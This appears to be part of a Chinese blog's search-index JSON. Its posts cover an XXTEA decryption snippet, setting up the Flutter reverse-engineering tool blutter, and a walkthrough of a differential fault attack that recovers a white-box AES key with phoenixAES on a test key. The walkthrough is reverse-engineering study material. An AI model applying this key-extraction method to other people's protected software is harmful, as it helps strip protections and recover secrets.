null) &#123; return utf8.decode(decrypted); &#125; &#125;&#125;void main() &#123; String str = &quot;UAsFvs3tDyTxFPGb7WbyBYSm05VWrJxgjArj9mx490pfH1LO&quot;; String key = &quot;17a389e9efdad7ce&quot;; String? encrypt_data = xxtea.decryptToString(str, key); print(encrypt_data);&#125;"},{"title":"安装blutter","path":"/2024/06/22/安装blutter/","content":"安装blutter1git clone https://github.com/worawit/blutter --depth=1 然后安装依赖 12sudo apt install python3-pyelftools python3-requests git cmake ninja-buildpkg-config libicu-dev libcapstone-dev 遇到的几种报错和解决方法： 更新apt源就行 1sudo apt-get update 要全程挂代理才行 https://blog.csdn.net/qq_63701832/article/details/131426713 gcc版本低了，要gcc13 1sudo apt install gcc 成功，配了三天，人麻了"},{"title":"White-box AES","path":"/2024/06/22/White-box-AES/","content":"从网上找了一份aes源码进行白盒aes测试 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204205206207208209210211212213214215216217218219220221222223224225226227228229230231232233234235236237238239240241242243244245246247248249250251252253254255256257258259260261262263264265266267268269270271272273274275276277278279280281282283284285286287288289290291292293294295296297298299300301302303304305306307308309310311312313314315316317318319320321322323324325326327import reimport binasciiclass AES:#128-ECB sbox = [0x63, 0x7C, 0x77, 0x7B, 0xF2, 0x6B, 0x6F, 0xC5, 0x30, 0x01, 0x67, 0x2B, 0xFE, 0xD7, 0xAB, 0x76, 0xCA, 0x82, 0xC9, 0x7D, 0xFA, 0x59, 0x47, 0xF0, 0xAD, 0xD4, 0xA2, 0xAF, 0x9C, 0xA4, 0x72, 0xC0, 0xB7, 0xFD, 0x93, 0x26, 0x36, 0x3F, 0xF7, 0xCC, 0x34, 0xA5, 0xE5, 0xF1, 0x71, 0xD8, 0x31, 0x15, 0x04, 0xC7, 0x23, 0xC3, 0x18, 0x96, 0x05, 0x9A, 0x07, 0x12, 0x80, 0xE2, 0xEB, 0x27, 0xB2, 0x75, 0x09, 0x83, 0x2C, 0x1A, 0x1B, 0x6E, 0x5A, 0xA0, 0x52, 0x3B, 0xD6, 0xB3, 0x29, 0xE3, 0x2F, 0x84, 0x53, 0xD1, 0x00, 0xED, 0x20, 0xFC, 0xB1, 0x5B, 0x6A, 0xCB, 0xBE, 0x39, 0x4A, 0x4C, 0x58, 0xCF, 0xD0, 0xEF, 0xAA, 0xFB, 0x43, 0x4D, 0x33, 0x85, 0x45, 0xF9, 0x02, 0x7F, 0x50, 0x3C, 0x9F, 0xA8, 0x51, 0xA3, 0x40, 0x8F, 0x92, 0x9D, 0x38, 0xF5, 0xBC, 0xB6, 0xDA, 0x21, 0x10, 0xFF, 0xF3, 0xD2, 0xCD, 0x0C, 0x13, 0xEC, 0x5F, 0x97, 0x44, 0x17, 0xC4, 0xA7, 0x7E, 0x3D, 0x64, 0x5D, 0x19, 0x73, 0x60, 0x81, 0x4F, 0xDC, 0x22, 0x2A, 0x90, 0x88, 0x46, 0xEE, 0xB8, 0x14, 0xDE, 0x5E, 0x0B, 0xDB, 0xE0, 0x32, 0x3A, 0x0A, 0x49, 0x06, 0x24, 0x5C, 0xC2, 0xD3, 0xAC, 0x62, 0x91, 0x95, 0xE4, 0x79, 0xE7, 0xC8, 0x37, 0x6D, 0x8D, 0xD5, 0x4E, 0xA9, 0x6C, 0x56, 0xF4, 0xEA, 0x65, 0x7A, 0xAE, 0x08, 0xBA, 0x78, 0x25, 0x2E, 0x1C, 0xA6, 0xB4, 0xC6, 0xE8, 0xDD, 0x74, 0x1F, 0x4B, 0xBD, 0x8B, 0x8A, 0x70, 0x3E, 0xB5, 0x66, 0x48, 0x03, 0xF6, 0x0E, 0x61, 0x35, 0x57, 0xB9, 0x86, 0xC1, 0x1D, 0x9E, 0xE1, 0xF8, 0x98, 0x11, 0x69, 0xD9, 0x8E, 0x94, 0x9B, 0x1E, 0x87, 0xE9, 0xCE, 0x55, 0x28, 0xDF, 0x8C, 0xA1, 0x89, 0x0D, 0xBF, 0xE6, 0x42, 0x68, 0x41, 0x99, 0x2D, 0x0F, 0xB0, 0x54, 0xBB, 0x16] s_box = &#123;&#125; ns_box = &#123; &#125; Rcon = &#123; 1: [&#x27;0x01&#x27;, &#x27;0x00&#x27;, &#x27;0x00&#x27;, &#x27;0x00&#x27;], 2: [&#x27;0x02&#x27;, &#x27;0x00&#x27;, &#x27;0x00&#x27;, &#x27;0x00&#x27;], 3: [&#x27;0x04&#x27;, &#x27;0x00&#x27;, &#x27;0x00&#x27;, &#x27;0x00&#x27;], 4: [&#x27;0x08&#x27;, &#x27;0x00&#x27;, &#x27;0x00&#x27;, &#x27;0x00&#x27;], 5: [&#x27;0x10&#x27;, &#x27;0x00&#x27;, &#x27;0x00&#x27;, &#x27;0x00&#x27;], 6: [&#x27;0x20&#x27;, &#x27;0x00&#x27;, &#x27;0x00&#x27;, &#x27;0x00&#x27;], 7: [&#x27;0x40&#x27;, &#x27;0x00&#x27;, &#x27;0x00&#x27;, &#x27;0x00&#x27;], 8: [&#x27;0x80&#x27;, &#x27;0x00&#x27;, &#x27;0x00&#x27;, &#x27;0x00&#x27;], 9: [&#x27;0x1B&#x27;, &#x27;0x00&#x27;, &#x27;0x00&#x27;, &#x27;0x00&#x27;], 10: [&#x27;0x36&#x27;, &#x27;0x00&#x27;, &#x27;0x00&#x27;, &#x27;0x00&#x27;] &#125; Matrix = [ [&#x27;0x02&#x27;, &#x27;0x03&#x27;, &#x27;0x01&#x27;, &#x27;0x01&#x27;], [&#x27;0x01&#x27;, &#x27;0x02&#x27;, &#x27;0x03&#x27;, &#x27;0x01&#x27;], [&#x27;0x01&#x27;, &#x27;0x01&#x27;, &#x27;0x02&#x27;, &#x27;0x03&#x27;], [&#x27;0x03&#x27;, &#x27;0x01&#x27;, &#x27;0x01&#x27;, &#x27;0x02&#x27;] ] ReMatrix = [ [&#x27;0x0e&#x27;, &#x27;0x0b&#x27;, &#x27;0x0d&#x27;, &#x27;0x09&#x27;], [&#x27;0x09&#x27;, &#x27;0x0e&#x27;, &#x27;0x0b&#x27;, &#x27;0x0d&#x27;], [&#x27;0x0d&#x27;, &#x27;0x09&#x27;, &#x27;0x0e&#x27;, &#x27;0x0b&#x27;], [&#x27;0x0b&#x27;, &#x27;0x0d&#x27;, &#x27;0x09&#x27;, &#x27;0x0e&#x27;] ] plaintext = [[], [], [], []] plaintext1 = [[], [], [], []] subkey = [[], [], [], []] def __init__(self, key):#密钥扩展 self.s_box = dict(zip([&quot;0x%02x&quot;%i for i in range(256)], [&quot;0x%02x&quot;%i for i in self.sbox])) self.ns_box = dict(zip(self.s_box.values(), self.s_box.keys())) for i in range(4): for j in range(0, 8, 2): self.subkey[i].append(&quot;0x&quot; + key[i * 8 + j:i * 8 + j + 2]) # print(self.subkey) for i in range(4, 44): if i % 4 != 0: tmp = xor_32(self.subkey[i - 1], self.subkey[i - 4],0) self.subkey.append(tmp) else: # 4的倍数的时候执行 tmp1 = self.subkey[i - 1][1:] tmp1.append(self.subkey[i - 1][0]) # print(tmp1) for m in range(4): tmp1[m] = self.s_box[tmp1[m]] # tmp1 = self.s_box[&#x27;cf&#x27;] tmp1 = xor_32(tmp1, self.Rcon[i / 4], 0) self.subkey.append(xor_32(tmp1, self.subkey[i - 4],0)) def AddRoundKey(self, round):#轮密钥加 for i in range(4): self.plaintext[i] = xor_32(self.plaintext[i], self.subkey[round * 4 + i],0) # print(&#x27;AddRoundKey&#x27;,self.plaintext) def PlainSubBytes(self): for i in range(4): for j in range(4): self.plaintext[i][j] = self.s_box[self.plaintext[i][j]] # print(&#x27;PlainSubBytes&#x27;,self.plaintext) def RePlainSubBytes(self): for i in range(4): for j in range(4): self.plaintext[i][j] = self.ns_box[self.plaintext[i][j]] def ShiftRows(self):#行移位 p1, p2, p3, p4 = self.plaintext[0][1], self.plaintext[1][1], self.plaintext[2][1], self.plaintext[3][1] self.plaintext[0][1] = p2 self.plaintext[1][1] = p3 self.plaintext[2][1] = p4 self.plaintext[3][1] = p1 p1, p2, p3, p4 = self.plaintext[0][2], self.plaintext[1][2], self.plaintext[2][2], self.plaintext[3][2] self.plaintext[0][2] = p3 self.plaintext[1][2] = p4 self.plaintext[2][2] = p1 self.plaintext[3][2] = p2 p1, p2, p3, p4 = self.plaintext[0][3], self.plaintext[1][3], self.plaintext[2][3], self.plaintext[3][3] self.plaintext[0][3] = p4 self.plaintext[1][3] = p1 self.plaintext[2][3] = p2 self.plaintext[3][3] = p3 # print(&#x27;ShiftRows&#x27;,self.plaintext) def ReShiftRows(self): p1, p2, p3, p4 = self.plaintext[0][1], self.plaintext[1][1], self.plaintext[2][1], self.plaintext[3][1] self.plaintext[3][1] = p3 self.plaintext[2][1] = p2 self.plaintext[0][1] = p4 self.plaintext[1][1] = p1 p1, p2, p3, p4 = self.plaintext[0][2], self.plaintext[1][2], self.plaintext[2][2], self.plaintext[3][2] self.plaintext[0][2] = p3 self.plaintext[1][2] = p4 self.plaintext[2][2] = p1 self.plaintext[3][2] = p2 p1, p2, p3, p4 = self.plaintext[0][3], self.plaintext[1][3], self.plaintext[2][3], self.plaintext[3][3] self.plaintext[0][3] = p2 self.plaintext[1][3] = p3 self.plaintext[2][3] = p4 self.plaintext[3][3] = p1 def MixColumns(self):#列混淆 for i in range(4): for j in range(4): self.plaintext1[i].append(MatrixMulti(self.Matrix[j], self.plaintext[i])) # print(&#x27;MixColumns&#x27;,self.plaintext1) def ReMixColumns(self): for i in range(4): for j in range(4): self.plaintext1[i].append(MatrixMulti(self.ReMatrix[j], self.plaintext[i])) def AESEncryption(self, plaintext,wb): self.plaintext = [[], [], [], []] for i in range(4): for j in range(0, 8, 2): self.plaintext[i].append(&quot;0x&quot; + plaintext[i * 8 + j:i * 8 + j + 2]) self.AddRoundKey(0) for i in range(9): if wb!=-1 and i==8: self.plaintext[wb//4][wb%4]=&#x27;0x01&#x27; self.PlainSubBytes() self.ShiftRows() self.MixColumns() self.plaintext = self.plaintext1 self.plaintext1 = [[], [], [], []] self.AddRoundKey(i + 1) self.PlainSubBytes() self.ShiftRows() self.AddRoundKey(10) return Matrixtostr(self.plaintext) def AESDecryption(self, cipher): self.plaintext = [[], [], [], []] for i in range(4): for j in range(0, 8, 2): self.plaintext[i].append(&#x27;0x&#x27; + cipher[i * 8 + j:i * 8 + j + 2]) # print(self.ns_box) self.AddRoundKey(10) for i in range(9): self.ReShiftRows() self.RePlainSubBytes() self.AddRoundKey(9-i) self.ReMixColumns() self.plaintext = self.plaintext1 self.plaintext1 = [[], [], [], []] self.ReShiftRows() self.RePlainSubBytes() self.AddRoundKey(0) return Matrixtostr(self.plaintext) def Encryption(self, text,wb=-1): group = PlaintextGroup(TextToByte(text), 32, 1) # print(group) cipher = &quot;&quot; for i in range(len(group)): cipher = cipher + self.AESEncryption(group[i],wb) return cipher def Decryption(self, cipher): group = PlaintextGroup(cipher, 32, 0) # print(group) text = &#x27;&#x27; for i in range(len(group)): text = text + self.AESDecryption(group[i]) text = ByteToText(text) return textdef xor_32(start, end, key): a = [] for i in range(0, 4): xor_tmp = &quot;&quot; b = hextobin(start[i]) c = hextobin(end[i]) d = bin(key)[2:].rjust(8,&#x27;0&#x27;) for j in range(8): tmp = int(b[j], 10) ^ int(c[j], 10) ^ int(d[j],10) xor_tmp += str(tmp ) a.append(bintohex(xor_tmp)) return adef xor_8(begin, end): xor_8_tmp = &quot;&quot; for i in range(8): xor_8_tmp += str(int(begin[i]) ^ int(end[i])) return xor_8_tmpdef hextobin(word): word = bin(int(word, 16))[2:] for i in range(0, 8-len(word)): word = &#x27;0&#x27;+word return worddef bintohex(word): word = hex(int(word, 2)) if len(word) == 4: return word elif len(word) &lt; 4: return word.replace(&#x27;x&#x27;, &#x27;x0&#x27;)def MatrixMulti(s1, s2): result = [] s3 = [] for i in range(4): s3.append(hextobin(s2[i])) for i in range(4): result.append(MultiProcess(int(s1[i], 16), s3[i])) for i in range(3): result[0] = xor_8(result[0], result[i+1]) return bintohex(result[0])def MultiProcess(a, b): if a == 1: return b elif a == 2: if b[0] == &#x27;0&#x27;: b = b[1:] + &#x27;0&#x27; else: b = b[1:] + &#x27;0&#x27; b = xor_8(b, &#x27;00011011&#x27;) return b elif a == 3: tmp_b = b if b[0] == &#x27;0&#x27;: b = b[1:] + &#x27;0&#x27; else: b = b[1:] + &#x27;0&#x27; b = xor_8(b, &#x27;00011011&#x27;) return xor_8(b, tmp_b) elif a == 9: tmp_b = b return xor_8(tmp_b, MultiProcess(2, MultiProcess(2, MultiProcess(2, b)))) elif a == 11: tmp_b = b return xor_8(tmp_b, xor_8(MultiProcess(2, MultiProcess(2, MultiProcess(2, b))), MultiProcess(2, b))) elif a == 13: tmp_b = b return xor_8(tmp_b, xor_8(MultiProcess(2, MultiProcess(2, MultiProcess(2, b))), MultiProcess(2, MultiProcess(2, b)))) elif a == 14: return xor_8(MultiProcess(2, b), xor_8(MultiProcess(2, MultiProcess(2, MultiProcess(2, b))), MultiProcess(2, MultiProcess(2, b))))def Matrixtostr(matrix): result = &quot;&quot; for i in range(4): for j in range(4): result += matrix[i][j][2:] return resultdef PlaintextGroup(plaintext, length, flag): group = re.findall(&#x27;.&#123;&#x27;+str(length)+&#x27;&#125;&#x27;, plaintext) group.append(plaintext[len(group)*length:]) if group[-1] == &#x27;&#x27; and flag: group[-1] = &#x27;16161616161616161616161616161616&#x27; elif len(group[-1]) &lt; length and flag: tmp = int((length-len(group[-1])) / 2) if tmp &lt; 10: for i in range(tmp): group[-1] = group[-1] + &#x27;0&#x27;+str(tmp) else: for i in range(tmp): group[-1] = group[-1] + str(tmp) elif not flag: del group[-1] return group#字符串转16进制def TextToByte(words): text = words.encode(&#x27;utf-8&#x27;).hex() return textdef ByteToText(encode): tmp = int(encode[-2:]) word = &#x27;&#x27; for i in range(len(encode)-tmp*2): word = word + encode[i] # print(word) word = bytes.decode(binascii.a2b_hex(word)) return word#字节非轮异或def xorbytes(bytes1,bytes2): length=min(len(bytes1),len(bytes2)) output=bytearray() for i in range(length): output.append(bytes1[i]^bytes2[i]) return bytes(output)key = &#x27;&#x27;for i in &quot;16uopAJc9tgxYSWO&quot;: key+=hex(ord(i))[2:].rjust(2,&quot;0&quot;)A1 = AES(key)print(A1.Encryption(&quot;asdfghjklasdfghj&quot;)[0:32])for i in range(16): print(A1.Encryption(&quot;asdfghjklasdfghj&quot;,i)[0:32]) 测试密钥:16uopAJc9tgxYSWO（3136756f70414a63397467785953574f） 这里应该当作不知道密钥的值，通过DAF攻击还原密钥 在第9轮加密时候构造缺陷数据（改变密文的一个字节） 获取正确密文和构造缺陷数据时的密文，需要对密文16个字节都进行一次构造缺陷数据 容易看出每一组构造缺陷数据得到的密文和正确的密文只有4个字节不同 通过获得的1+16组密文通过phoenixAES获取第十轮密钥 12345678910111213141516171819202122232425import phoenixAESdata = &quot;&quot;&quot;6c2baf57aeb663a830eaee17bcdb5894d32baf57aeb6637a30ea0c17bc2458946c2baff2aeb623a83018ee17b9db58946c2b6157ae0063a8e3eaee17bcdb583c6c71af579cb663a830eaee3abcdb6a946ca5af57f1b663a830eaeebbbcdbff94972baf57aeb6634530ea8d17bcd158946c2baf8baeb6dba83095ee17f1db58946c2b1b57ae7563a8f3eaee17bcdb580d6c2b3c57ae9d63a867eaee17bcdb584f6ccfaf57adb663a830eaee4fbcdb3d949b2baf57aeb663af30ead717bc8058946c2baf67aeb65ea83086ee17eddb58946c2baf29aeb637a8304aee170adb58946c2b4357ae9463a892eaee17bcdb58b86c9eaf572eb663a830eaeeaebcdb2e94fe2baf57aeb6639a30eae917bcb55894&quot;&quot;&quot;with open(&#x27;crackfile&#x27;, &#x27;w&#x27;) as fp: fp.write(data)phoenixAES.crack_file(&#x27;crackfile&#x27;, [], True, False, verbose=2) 出现以下内容表示成功获取第十轮的密钥 然后用Stark还原原始密钥 发现成功还原出原始密钥"},{"path":"/about/index.html","content":"从陌生人到陌生人，你用了多久"}]